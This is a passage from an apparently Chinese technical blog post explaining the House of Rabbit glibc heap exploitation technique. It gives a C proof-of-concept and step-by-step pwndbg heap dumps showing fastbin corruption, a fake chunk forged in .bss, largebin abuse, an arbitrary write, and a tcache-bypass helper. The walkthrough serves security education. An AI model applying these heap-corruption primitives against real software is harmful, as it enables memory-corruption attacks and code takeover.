申请 fast chunk 和 small chunk.\n"</span></span><br><span class="line"><span class="string">"  fast = %p\n"</span></span><br><span class="line"><span class="string">"  small = %p\n"</span>, fast, small);</span><br><span class="line"><span class="built_in">free</span>(fast);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Free fast chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. 在 .bss 构造 fake_chunk\n"</span>);</span><br><span class="line">gbuf[<span class="number">0</span>] = <span class="number">0xfffffffffffffff0</span>;</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x10</span>;</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0x21</span>;</span><br><span class="line">gbuf[<span class="number">7</span>] = <span class="number">0x1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fake_chunk1 (size : 0x%lx) is at %p\n"</span></span><br><span class="line"><span class="string">"  fake_chunk2 (size : 0x%lx) is at %p\n\n"</span></span><br><span class="line">, gbuf[<span class="number">3</span>], &amp;gbuf[<span class="number">2</span>], gbuf[<span class="number">1</span>], &amp;gbuf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"漏洞利用 (UAF，fastbins dup等)\n"</span></span><br><span class="line"><span class="string">"  *fast = %p\n"</span></span><br><span class="line">, fake);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fastbins list : [%p, %p, %p]\n\n"</span>, fast<span class="number">-0x10</span>, fake, *(<span class="keyword">void</span> **)(fake+<span class="number">0x10</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4. 调用 malloc_consolidate\n"</span></span><br><span class="line"><span class="string">"  Free 和top相邻的 small chunk (%p) , 将 fake_chunk1(%p) 插入 unsorted bins 链表.\n\n"</span></span><br><span class="line">, small, fake);</span><br><span class="line"><span class="built_in">free</span>(small);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"5. 将 unsorted bins 链接到合适的链表\n"</span></span><br><span class="line"><span class="string">"  将 fake_chunk1 的 size 重写为 0xa0001 来绕过 'size &lt; av-&gt;system_mem' 检查.\n"</span>);</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xa00001</span>;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  申请一个超大 chunk.\n"</span></span><br><span class="line"><span class="string">"  现在, fake_chunk1 会链接到 largebin[126](max).\n"</span></span><br><span class="line"><span class="string">"  然后, 将fake_chunk1 的 size 改为 0xfffffffffffffff1.\n\n"</span>);</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"6. 覆写 .data 段上的目标值\n"</span></span><br><span class="line"><span class="string">"  目标值位于 %p\n"</span></span><br><span class="line"><span class="string">"  覆写之前是 : %s\n"</span></span><br><span class="line">, &amp;target, target);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>((<span class="keyword">void</span>*)&amp;target-(<span class="keyword">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  在 %p 申请 0x10 byte, 然后任意写入.\n"</span>, victim);</span><br><span class="line"><span class="built_in">strcpy</span>(victim, <span class="string">"Hacked!!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  覆写之后是  : %s\n"</span>, target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evict_tcache</span><span class="params">(<span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(GLIBC_VERSION) &amp;&amp; (GLIBC_VERSION &gt;= 26)</span></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>(GLIBC_VERSION &lt; 29)</span></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">void</span>**)p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (GLIBC_VERSION == 29)</span></span><br><span class="line"><span class="keyword">char</span> *counts = (<span class="keyword">char</span>*)(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p &amp; ~<span class="number">0xfff</span>) + <span class="number">0x10</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">uint16_t</span> *counts = (<span class="keyword">char</span>*)(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p &amp; ~<span class="number">0xfff</span>) + <span class="number">0x10</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">counts[(<span class="built_in">size</span> + <span class="number">0x10</span> &gt;&gt; <span class="number">4</span>) - <span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/29/o9rImcn6AxFiatL.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/29/o9rImcn6AxFiatL.png" class="lazyload"></a></p><h3 id="分步分析"><a href="#分步分析" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-malloc两个堆块使av-gt-system-mem-gt-0xa00000"><a href="#1-malloc两个堆块使av-gt-system-mem-gt-0xa00000" class="headerlink" title="1  malloc两个堆块使av-&gt;system_mem &gt; 0xa00000"></a>1  malloc两个堆块使av-&gt;system_mem &gt; 0xa00000</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x402000 r-xp     2000 0      /home/kabeo/Desktop/house_of_rabbit</span><br><span class="line">          0x601000           0x602000 r--p     1000 1000   /home/kabeo/Desktop/house_of_rabbit</span><br><span class="line">          0x602000           0x603000 rw-p     1000 2000   /home/kabeo/Desktop/house_of_rabbit</span><br><span class="line">          0x603000          0x1024000 rw-p   a21000 0      [heap]  &lt;===== 扩大到0xa21000</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdd000     0x7ffff7fe0000 rw-p     3000 0      </span><br><span class="line">    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure></div><h4 id="2-Free-fast-chunk-插入-fastbins-链表"><a href="#2-Free-fast-chunk-插入-fastbins-链表" class="headerlink" title="2 Free fast chunk 插入 fastbins 链表"></a>2 Free fast chunk 插入 fastbins 链表</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(fast);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x91</span><br><span class="line">&#125;</span><br><span class="line">0x603020 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 145, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6030b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 10620753, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30xg 0x603020-0x20</span><br><span class="line">0x603000:0x00000000000000000x0000000000000021 &lt;&#x3D;&#x3D;&#x3D;&#x3D; fast</span><br><span class="line">0x603010:0x00000000000000000x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000000091 &lt;&#x3D;&#x3D;&#x3D;&#x3D; small</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000a20f51 &lt;&#x3D;&#x3D;&#x3D;&#x3D; top chunk</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="3-在-bss-段构造-fake-chunk"><a href="#3-在-bss-段构造-fake-chunk" class="headerlink" title="3 在 .bss 段构造 fake_chunk"></a>3 在 .bss 段构造 fake_chunk</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gbuf[<span class="number">0</span>] = <span class="number">0xfffffffffffffff0</span>;</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x10</span>;</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0x21</span>;</span><br><span class="line">gbuf[<span class="number">7</span>] = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg 0x6020f0-0x20</span><br><span class="line">0x6020d0 &lt;stdin@@GLIBC_2.2.5&gt;:0x00007ffff7dd18e00x0000000000000000</span><br><span class="line">0x6020e0 &lt;gbuf&gt;:0xfffffffffffffff00x0000000000000010</span><br><span class="line">0x6020f0 &lt;gbuf+16&gt;:0x00000000000000000x0000000000000021 &lt;&#x3D;&#x3D;&#x3D;&#x3D; fake chunk</span><br><span class="line">0x602100 &lt;gbuf+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x602110 &lt;gbuf+48&gt;:0x00000000000000000x0000000000000001</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000000000000x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="4-通过其他漏洞改写fast-chunk指向fake-chunk"><a href="#4-通过其他漏洞改写fast-chunk指向fake-chunk" class="headerlink" title="4 通过其他漏洞改写fast chunk指向fake chunk"></a>4 通过其他漏洞改写fast chunk指向fake chunk</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x6020f0 (gbuf+16) ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30xg 0x603020-0x20</span><br><span class="line">0x603000:0x00000000000000000x0000000000000021</span><br><span class="line">0x603010:0x00000000006020f00x0000000000000000 &lt;&#x3D;&#x3D;&#x3D;&#x3D; 改写fastbin指向</span><br><span class="line">0x603020:0x00000000000000000x0000000000000091</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000a20f51</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="5-调用-malloc-consolidate，Free-和top相邻的-small-chunk-将-fake-chunk1插入-unsorted-bins-链表"><a href="#5-调用-malloc-consolidate，Free-和top相邻的-small-chunk-将-fake-chunk1插入-unsorted-bins-链表" class="headerlink" title="5 调用 malloc_consolidate，Free 和top相邻的 small chunk , 将 fake_chunk1插入 unsorted bins 链表"></a>5 调用 malloc_consolidate，Free 和top相邻的 small chunk , 将 fake_chunk1插入 unsorted bins 链表</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(small);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6020f0 (gbuf+16) —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6020f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x&#x2F;30xg 0x603020-0x20</span><br><span class="line">0x603000:0x00000000000000000x0000000000a21001 &lt;&#x3D;&#x3D;&#x3D;&#x3D; fast chunk size改变</span><br><span class="line">0x603010:0x00000000006020f00x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000a20fe1 &lt;&#x3D;&#x3D;&#x3D;&#x3D; small chunk size改变</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000a20f51</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="6-申请一个超大-chunk，fake-chunk1将链接到-largebin，修改fake-chunk1-size"><a href="#6-申请一个超大-chunk，fake-chunk1将链接到-largebin，修改fake-chunk1-size" class="headerlink" title="6 申请一个超大 chunk，fake_chunk1将链接到 largebin，修改fake_chunk1 size"></a>6 申请一个超大 chunk，fake_chunk1将链接到 largebin，修改fake_chunk1 size</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xa00001</span>;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"></span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 10485777, </span><br><span class="line">  fd &#x3D; 0x6020f0 &lt;gbuf+16&gt;, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0xa20fe1</span><br><span class="line">&#125;</span><br><span class="line">0x1003010 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 135153, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x80000: 0x6020f0 (gbuf+16) —▸ 0x7ffff7dd2348 (main_arena+2088) ◂— 0x6020f0</span><br><span class="line">pwndbg&gt; x&#x2F;30xg 0x603020-0x20</span><br><span class="line">0x603000:0x00000000000000000x0000000000a00011</span><br><span class="line">0x603010:0x00000000006020f00x0000000000000000</span><br><span class="line">0x603020:0x00000000000000000x0000000000a20fe1</span><br><span class="line">0x603030:0x00000000000000000x0000000000000000</span><br><span class="line">0x603040:0x00000000000000000x0000000000000000</span><br><span class="line">0x603050:0x00000000000000000x0000000000000000</span><br><span class="line">0x603060:0x00000000000000000x0000000000000000</span><br><span class="line">0x603070:0x00000000000000000x0000000000000000</span><br><span class="line">0x603080:0x00000000000000000x0000000000000000</span><br><span class="line">0x603090:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030b0:0x00000000000000000x0000000000a20f51</span><br><span class="line">0x6030c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6030e0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">0x6020d0 &lt;stdin@@GLIBC_2.2.5&gt;:0x00007ffff7dd18e00x0000000000000000</span><br><span class="line">0x6020e0 &lt;gbuf&gt;:0xfffffffffffffff00x0000000000000010</span><br><span class="line">0x6020f0 &lt;gbuf+16&gt;:0x00000000000000000xfffffffffffffff1 &lt;&#x3D;&#x3D;&#x3D;&#x3D; 修改fake chunk size</span><br><span class="line">0x602100 &lt;gbuf+32&gt;:0x00007ffff7dd23480x00007ffff7dd2348</span><br><span class="line">0x602110 &lt;gbuf+48&gt;:0x00000000006020f00x00000000006020f0</span><br><span class="line">0x602120:0x00000000000000000x0000000000000000</span><br><span class="line">0x602130:0x00000000000000000x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000000000000x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="7-覆写可控内存，达到内存任意写"><a href="#7-覆写可控内存，达到内存任意写" class="headerlink" title="7 覆写可控内存，达到内存任意写"></a>7 覆写可控内存，达到内存任意写</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>((<span class="keyword">void</span>*)&amp;target-(<span class="keyword">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(victim, <span class="string">"Hacked!!"</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20xg 0x602080-0x10</span><br><span class="line">0x602070:0x00000000000000000x0000000000000021</span><br><span class="line">0x602080 &lt;target&gt;:0x212164656b6361480x00007ffff7dd1b00</span><br><span class="line">0x602090 &lt;target+16&gt;:0x00000000000000000x0000000000000051</span><br><span class="line">0x6020a0 &lt;target+32&gt;:0x00007ffff7dd1b780x00007ffff7dd1b78</span><br><span class="line">0x6020b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020c0 &lt;stdout@@GLIBC_2.2.5&gt;:0x00007ffff7dd26200x0000000000000000</span><br><span class="line">0x6020d0 &lt;stdin@@GLIBC_2.2.5&gt;:0x00007ffff7dd18e00x0000000000000000</span><br><span class="line">0x6020e0 &lt;gbuf&gt;:0x00000000000000500x0000000000000010</span><br><span class="line">0x6020f0 &lt;gbuf+16&gt;:0x00000000000000000xffffffffffffff81</span><br><span class="line">0x602100 &lt;gbuf+32&gt;:0x00007ffff7dd23480x00007ffff7dd2348</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/29/b9ZesHUO6zIApnC.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/29/b9ZesHUO6zIApnC.png" class="lazyload"></a></p><h3 id="Glibc-2-26"><a href="#Glibc-2-26" class="headerlink" title="Glibc 2.26"></a>Glibc 2.26</h3><p>从Glibc2.26开始加入了tcache，可通过以下代码绕过</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">evict_tcache</span><span class="params">(<span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(GLIBC_VERSION) &amp;&amp; (GLIBC_VERSION &gt;= 26)</span></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span>(GLIBC_VERSION &lt; 29)</span></span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">void</span>**)p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"></span><br><span class="line"><span 